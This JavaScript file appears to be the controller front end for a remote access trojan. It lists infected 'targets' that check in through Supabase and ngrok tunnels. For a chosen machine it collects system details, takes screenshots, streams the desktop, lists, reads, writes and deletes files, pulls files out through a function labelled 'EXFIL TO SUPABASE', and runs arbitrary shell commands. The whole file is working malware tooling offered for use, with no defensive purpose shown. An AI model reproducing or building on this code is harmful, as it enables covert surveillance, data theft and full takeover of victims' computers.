let BASE = "";
let devices = [];
let selectedDeviceIdx = -1;

const supabaseClient = supabase.createClient(
	supabase_auth['URL'],
	supabase_auth['KEY'],
);

const deviceListEl = document.getElementById("device-list");
const deviceCountEl = document.getElementById("device-count");
const connectBtn = document.getElementById("connect-btn");
const deviceErrorEl = document.getElementById("device-error");

document.getElementById("connect-btn").addEventListener("click", async () => {
	if (selectedDeviceIdx !== -1) {
		await connectToDevice()
	}
})

function selectDevice(idx) {
	selectedDeviceIdx = idx;
	deviceErrorEl.textContent = "";
	renderDeviceList();
}

function renderDeviceList() {
	if (devices.length === 0) {
		deviceListEl.innerHTML =
			'<div class="no-devices">no connected devices</div>';
		deviceCountEl.textContent = "0 devices connected";
		connectBtn.disabled = true;
		return;
	}

	deviceCountEl.textContent = `${devices.length} device${devices.length !== 1 ? "s" : ""} connected`;

	let html = "";
	devices.forEach((d, i) => {
		const selected = i === selectedDeviceIdx ? "selected" : "";
		const os = d.os || d.os_name || "unknown";
		html += `
						<div class="device-item ${selected}">
							<div class="status-indicator online"></div>
							<div class="device-name">${d.name || d.os_name || "unknown"}</div>
							<div class="device-os">${d.os_name || "windows"}</div>
							<div class="device-url">${d.ngrok_url}</div>
						</div>
					`;
	});


	deviceListEl.innerHTML = html;
	deviceListEl.querySelectorAll(".device-name").forEach((el, i) => {
		el.addEventListener("click", () => {
			selectDevice(i)

		})

	});
	connectBtn.disabled = selectedDeviceIdx === -1;
}

// ----- REALTIME SUBSCRIPTION -----
function subscribeToDevices() {
	// Initial fetch
	supabaseClient
		.from("connected")
		.select("*")
		.then(({ data, error }) => {
			if (error) {
				console.error("fetch error:", error);
				deviceErrorEl.textContent = "failed to load devices: " + error.message;
				return;
			}
			devices = data || [];
			renderDeviceList();
		});

	// Realtime inserts
	supabaseClient
		.channel("connected-devices")
		.on(
			"postgres_changes",
			{ event: "INSERT", schema: "public", table: "connected" },
			(payload) => {
				const newDevice = payload.new;
				// Avoid duplicates
				if (!devices.find((d) => d.ngrok_url === newDevice.ngrok_url)) {
					devices.push(newDevice);
					renderDeviceList();
				}
			},
		)
		.on(
			"postgres_changes",
			{ event: "DELETE", schema: "public", table: "connected" },
			(payload) => {
				const oldDevice = payload.old;
				devices = devices.filter((d) => d.ngrok_url !== oldDevice.ngrok_url);
				if (selectedDeviceIdx >= devices.length) {
					selectedDeviceIdx = -1;
				}
				renderDeviceList();
			},
		)
		.on(
			"postgres_changes",
			{ event: "UPDATE", schema: "public", table: "connected" },
			(payload) => {
				const updated = payload.new;
				const idx = devices.findIndex((d) => d.ngrok_url === updated.ngrok_url);
				if (idx !== -1) {
					devices[idx] = updated;
					renderDeviceList();
				}
			},
		)
		.subscribe();
}
subscribeToDevices();
async function connectToDevice() {
	if (selectedDeviceIdx === -1) return;

	const device = devices[selectedDeviceIdx];
	const addr = device.ngrok_url.replace(/\/+$/, "");

	deviceErrorEl.textContent = "connecting...";

	try {
		const res = await fetch(addr + "/", {
			headers: { "ngrok-skip-browser-warning": "true" },
		});
		let text = await res.text();
		text = text.replaceAll('"', "")
		if (text !== "Target Connected") {
			deviceErrorEl.textContent = "unexpected response: " + text;
			return;
		} else {

		}
	} catch (e) {
		deviceErrorEl.textContent = "connection failed: " + e.message;
		return;
	}

	// Switch to main screen
	BASE = addr;
	document.getElementById("device-screen").style.display = "none";
	document.getElementById("main-screen").style.display = "block";
	document.getElementById("status-target").textContent =
		device.name || device.ngrok_url;
	await getSysInfo()
}

function disconnect() {
	BASE = "";
	document.getElementById("main-screen").style.display = "none";
	document.getElementById("device-screen").style.display = "flex";
	deviceErrorEl.textContent = "";
	selectedDeviceIdx = -1;
	renderDeviceList();
}

// ----- CONNECT SCREEN -----
function setAddress(addr) {
	document.getElementById("server-address").value = addr;
}

// ----- UTILITY -----
async function api(url) {
	const res = await fetch(url, {
		headers: {
			"ngrok-skip-browser-warning": "true",
		},
	});
	if (!res.ok) throw new Error(`HTTP ${res.status}`);
	return res;
}

function show(el, content, ok = true) {
	const div = document.getElementById(el);
	div.textContent = content;
	div.className = "output " + (ok ? "success" : "error");
}
// ----- SYSTEM INFO -----
async function getSysInfo() {
	try {
		const res = await api(`${BASE}/sysinfo`);
		const data = await res.json();

		if (data.error) {
			show("sysinfo-output", "error: " + data.error, false);
			return;
		}

		const lines = [
			`hostname:   ${data.hostname}`,
			`os:         ${data.os} ${data.os_release} (${data.architecture})`,
			`user:       ${data.username}`,
			`ip:         ${data.ip}`,
			`cpu:        ${data.processor}`,
			`cores:      ${data.cpu_physical} physical / ${data.cpu_count} logical`,
			`cpu usage:  ${data.cpu_percent}%`,
			`ram:        ${data.ram_total_gb}GB total / ${data.ram_available_gb}GB free (${data.ram_percent}% used)`,
			`disk (c:\): ${data.disk_total_gb}GB total / ${data.disk_free_gb}GB free (${data.disk_percent}% used)`,
			`boot time:  ${new Date(data.boot_time * 1000).toLocaleString()}`,
		];

		show("sysinfo-output", lines.join("\n"), true);
	} catch (e) {
		show("sysinfo-output", e.message, false);
	}
}

// ----- SCREENSHOT -----
async function takeScreenshot() {
	const out = document.getElementById("screenshot-output");
	try {
		const res = await api(`${BASE}/screenshot`);
		const blob = await res.blob();
		const url = URL.createObjectURL(blob);
		out.innerHTML = `<img src="${url}" alt="screenshot" />`;
	} catch (e) {
		out.innerHTML = `<div class="output error">${e.message}</div>`;
	}
}

// ----- DIRECTORY LISTING -----
async function listDir() {
	const path = document.getElementById("dir-path").value || "";
	try {
		const res = await api(
			`${BASE}/getdir${path !== "" ? "?path=" + encodeURIComponent(path) : ""}`,
		);
		const data = await res.json();
		show("dir-output", Array.isArray(data) ? data.join("\n") : data, true);
	} catch (e) {
		show("dir-output", e.message, false);
	}
}

// ----- READ FILE -----
async function readFile() {
	const path = document.getElementById("read-path").value;
	try {
		const res = await api(`${BASE}/readfile?path=${encodeURIComponent(path)}`);
		const text = await res.text();
		const formatted = text
			.replace(/&/g, "&amp;")
			.replace(/</g, "&lt;")
			.replace(/>/g, "&gt;")
			.replace(/\r\n/g, "\n")
			.replace(/\n/g, "<br>")
			.replace(/\t/g, "&nbsp;&nbsp;&nbsp;&nbsp;");
		const div = document.getElementById("read-output");
		div.innerHTML = formatted;
		div.className = "output success";
	} catch (e) {
		show("read-output", e.message, false);
	}
}

// ----- CREATE FILE -----
async function createFile() {
	const path = document.getElementById("create-path").value;
	const content = document.getElementById("create-content").value;
	try {
		const res = await api(
			`${BASE}/createfile?path=${encodeURIComponent(path)}&content=${encodeURIComponent(content)}`,
		);
		const text = await res.text();
		show("create-output", "created / written: " + text, true);
	} catch (e) {
		show("create-output", e.message, false);
	}
}

// ----- DELETE FILE -----
async function deleteFile() {
	const path = document.getElementById("delete-path").value;
	try {
		const res = await api(
			`${BASE}/removefile?path=${encodeURIComponent(path)}`,
		);
		const text = await res.text();
		show("delete-output", text, true);
	} catch (e) {
		show("delete-output", e.message, false);
	}
}

// ----- DELETE FOLDER -----
async function deleteFolder() {
	const path = document.getElementById("delete-path").value;
	try {
		const res = await api(
			`${BASE}/removefolder?path=${encodeURIComponent(path)}`,
		);
		const text = await res.text();
		show("delete-output", text, true);
	} catch (e) {
		show("delete-output", e.message, false);
	}
}

// ----- DOWNLOAD (EXFIL TO SUPABASE) -----
async function downloadFile() {
	const path = document.getElementById("download-path").value;
	try {
		const res = await api(
			`${BASE}/downloadfile?path=${encodeURIComponent(path)}`,
		);
		let text = await res.text();
		const url = text.replaceAll('"', "");
		if (url.startsWith("http")) {
			const a = document.createElement("a");
			a.href = url;
			a.target = "_blank";
			a.click();
		} else {
			show("download-output", url, false);
		}
	} catch (e) {
		show("download-output", e.message, false);
	}
}

// ----- UPLOAD (FETCH FROM SUPABASE) -----
async function uploadFile() {
	const dwpath = document.getElementById("upload-path").value;
	const dbfilename = document.getElementById("upload-filename").value;
	try {
		const res = await api(
			`${BASE}/uploadfile?dwpath=${encodeURIComponent(dwpath)}&dbfilename=${encodeURIComponent(dbfilename)}`,
		);
		const text = await res.text();
		show("upload-output", text, true);
	} catch (e) {
		show("upload-output", e.message, false);
	}
}
let pc = null;
// ----- STREAM DESKTOP -----
async function startStream() {
	pc = new RTCPeerConnection();

	pc.ontrack = (event) => {
		document.getElementById("video-stream").srcObject = event.streams[0];
	};

	pc.addTransceiver("video", {
		direction: "recvonly",
	});
	const offer = await pc.createOffer();
	await pc.setLocalDescription(offer);

	const response = await fetch(`${BASE}/offer`, {
		method: "POST",
		headers: {
			"Content-Type": "application/json",
		},
		body: JSON.stringify(pc.localDescription),
	});

	const answer = await response.json();

	document.getElementById("stream-start-btn").style.display = "none";
	document.getElementById("stream-stop-btn").style.display = "inline-block";

	await pc.setRemoteDescription(answer);
}

async function stopStream() {
	if (pc) {
		pc.close();
		document.getElementById("stream-start-btn").style.display = "inline-block";
		document.getElementById("stream-stop-btn").style.display = "none";
		document.getElementById("video-stream").style.max_width = "0%";
	}
}

// ----- CMD -----
async function runCmd() {
	const cmd = document.getElementById("cmd-cmd").value;
	const path = document.getElementById("cmd-path").value;
	try {
		const res = await api(
			`${BASE}/cmd?cmd=${encodeURIComponent(cmd)}&path=${encodeURIComponent(path)}`,
		);
		const data = await res.json();
		let out = "";
		if (data.stdout) out += data.stdout;
		if (data.stderr) out += "\n[stderr]\n" + data.stderr;
		out += `\n[exit code: ${data.code}]`;
		show("cmd-output", out, data.code === 0);
	} catch (e) {
		show("cmd-output", e.message, false);
	}
}
window.takeScreenshot = takeScreenshot;
window.listDir = listDir;
window.readFile = readFile;
window.createFile = createFile;
window.deleteFile = deleteFile;
window.deleteFolder = deleteFolder;
window.downloadFile = downloadFile;
window.uploadFile = uploadFile;
window.runCmd = runCmd;
window.getSysInfo = getSysInfo;
window.startStream = startStream;
window.stopStream = stopStream;
window.disconnect = disconnect;
window.selectDevice = selectDevice;
window.connectToDevice = connectToDevice;
window.setAddress = setAddress;
